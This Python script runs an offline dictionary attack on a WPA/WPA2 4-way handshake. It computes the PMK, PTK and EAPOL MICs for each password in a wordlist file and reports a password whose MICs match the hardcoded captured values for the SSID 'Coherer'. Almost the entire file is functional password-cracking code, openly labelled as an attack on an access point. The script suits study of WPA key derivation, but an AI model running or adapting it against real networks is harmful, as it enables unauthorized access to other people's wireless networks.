#Used for computing HMAC
import hmac
#Used to convert from hex to binary
from binascii import a2b_hex, b2a_hex
#Used for computing PMK
from hashlib import pbkdf2_hmac, sha1, md5
 
#Pseudo-random function for generation of
#the pairwise transient key (PTK)
#key:       The PMK
#A:         b'Pairwise key expansion'
#B:         The apMac, cliMac, aNonce, and sNonce concatenated
#           like mac1 mac2 nonce1 nonce2
#           such that mac1 < mac2 and nonce1 < nonce2
#return:    The ptk
def PRF(key, A, B):
    #Number of bytes in the PTK
    nByte = 64
    i = 0
    R = b''
    #Each iteration produces 160-bit value and 512 bits are required
    while(i <= ((nByte * 8 + 159) / 160)):
        hmacsha1 = hmac.new(key, A + chr(0x00).encode() + B + chr(i).encode(), sha1)
        R = R + hmacsha1.digest()
        i += 1
    return R[0:nByte]
 
#Make parameters for the generation of the PTK
#aNonce:        The aNonce from the 4-way handshake
#sNonce:        The sNonce from the 4-way handshake
#apMac:         The MAC address of the access point
#cliMac:        The MAC address of the client
#return:        (A, B) where A and B are parameters
#               for the generation of the PTK
def MakeAB(aNonce, sNonce, apMac, cliMac):
    A = b"Pairwise key expansion"
    B = min(apMac, cliMac) + max(apMac, cliMac) + min(aNonce, sNonce) + max(aNonce, sNonce)
    return (A, B)
 
#Compute the 1st message integrity check for a WPA 4-way handshake
#pwd:       The password to test
#ssid:      The ssid of the AP
#A:         b'Pairwise key expansion'
#B:         The apMac, cliMac, aNonce, and sNonce concatenated
#           like mac1 mac2 nonce1 nonce2
#           such that mac1 < mac2 and nonce1 < nonce2
#data:      A list of 802.1x frames with the MIC field zeroed
#return:    (x, y, z) where x is the mic, y is the PTK, and z is the PMK
def MakeMIC(pwd, ssid, A, B, data, wpa = False):
    #Create the pairwise master key using 4096 iterations of hmac-sha1
    #to generate a 32 byte value
    pmk = pbkdf2_hmac('sha1', pwd.encode('ascii'), ssid.encode('ascii'), 4096, 32)
    #Make the pairwise transient key (PTK)
    ptk = PRF(pmk, A, B)
    #WPA uses md5 to compute the MIC while WPA2 uses sha1
    hmacFunc = md5 if wpa else sha1
    #Create the MICs using HMAC-SHA1 of data and return all computed values
    mics = [hmac.new(ptk[0:16], i, hmacFunc).digest() for i in data]
    mics_hex = [b2a_hex(mic).decode('ascii') for mic in mics]

    print("generated mic:", mics_hex)
    return (mics, ptk, pmk)

#Run a brief test showing the computation of the PTK, PMK, and MICS
#for a 4-way handshake

def TestPwds(S, ssid, aNonce, sNonce, apMac, cliMac, data, data2, data3, targMic, targMic2, targMic3):
    #Pre-computed values
    A, B = MakeAB(aNonce, sNonce, apMac, cliMac)
    #Loop over each password and test each one
    for i in S:
        mic, _, _ = MakeMIC(i, ssid, A, B, [data])
        v = b2a_hex(mic[0]).decode()[:-8]
        #First MIC doesn't match
        if(v != targMic):
            continue
        #First MIC matched... Try second
        mic2, _, _ = MakeMIC(i, ssid, A, B, [data2])
        v2 = b2a_hex(mic2[0]).decode()[:-8]
        if(v2 != targMic2):
            continue
        #First 2 match... Try last
        mic3, _, _ = MakeMIC(i, ssid, A, B, [data3])
        v3 = b2a_hex(mic3[0]).decode()[:-8]
        if(v3 != targMic3):
            continue
        #All of them match
        print('!!!Password Found!!!')
        print('Desired MIC1:\t\t' + targMic)
        print('Computed MIC1:\t\t' + v)
        print('\nDesired MIC2:\t\t' + targMic2)
        print('Computed MIC2:\t\t' + v2)
        print('\nDesired MIC2:\t\t' + targMic3)
        print('Computed MIC2:\t\t' + v3)
        print('Password:\t\t' + i)
        return i
    
    return None
 
if __name__ == "__main__":
     
    #Read a file of passwords containing
    #passwords separated by a newline
    with open('passwd.txt') as f:
        S = []
        for l in f:
            S.append(l.strip())
    #ssid name
    ssid = "Coherer"
    #ANonce
    aNonce = a2b_hex('3e8e967dacd960324cac5b6aa721235bf57b949771c867989f49d04ed47c6933')
    #SNonce
    sNonce = a2b_hex("cdf405ceb9d889ef3dec42609828fae546b7add7baecbb1a394eac5214b1d386")
    #Authenticator MAC (AP)
    apMac = a2b_hex("000d9382363a")
    #Station address: MAC of client
    cliMac = a2b_hex("000c4182b255")
    #The first MIC
    mic1 = "a462a7029ad5ba30b6af0df391988e45"
    #The entire 802.1x frame of the second handshake message with the MIC field set to all zeros
    data1 = a2b_hex("0203007502010a00100000000000000000cdf405ceb9d889ef3dec42609828fae546b7add7baecbb1a394eac5214b1d386000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001630140100000fac020100000fac040100000fac020000")
    #The second MIC
    mic2 = "7d0af6df51e99cde7a187453f0f93537"
    #The entire 802.1x frame of the third handshake message with the MIC field set to all zeros
    data2 = a2b_hex("020300af0213ca001000000000000000013e8e967dacd960324cac5b6aa721235bf57b949771c867989f49d04ed47c6933f57b949771c867989f49d04ed47c6934cf020000000000000000000000000000000000000000000000000000000000000050cfa72cde35b2c1e2319255806ab364179fd9673041b9a5939fa1a2010d2ac794e25168055f794ddc1fdfae3521f4446bfd11da98345f543df6ce199df8fe48f8cdd17adca87bf45711183c496d41aa0c")
    #The third MIC
    mic3 = "10bba3bdfbcfde2bc537509d71f2ecd1"
    #The entire 802.1x frame of the forth handshake message with the MIC field set to all zeros
    data3 = a2b_hex("0203005f02030a0010000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000")
    #Run an offline dictionary attack against the access point
    TestPwds(S, ssid, aNonce, sNonce, apMac, cliMac, data1, data2, data3, mic1, mic2, mic3)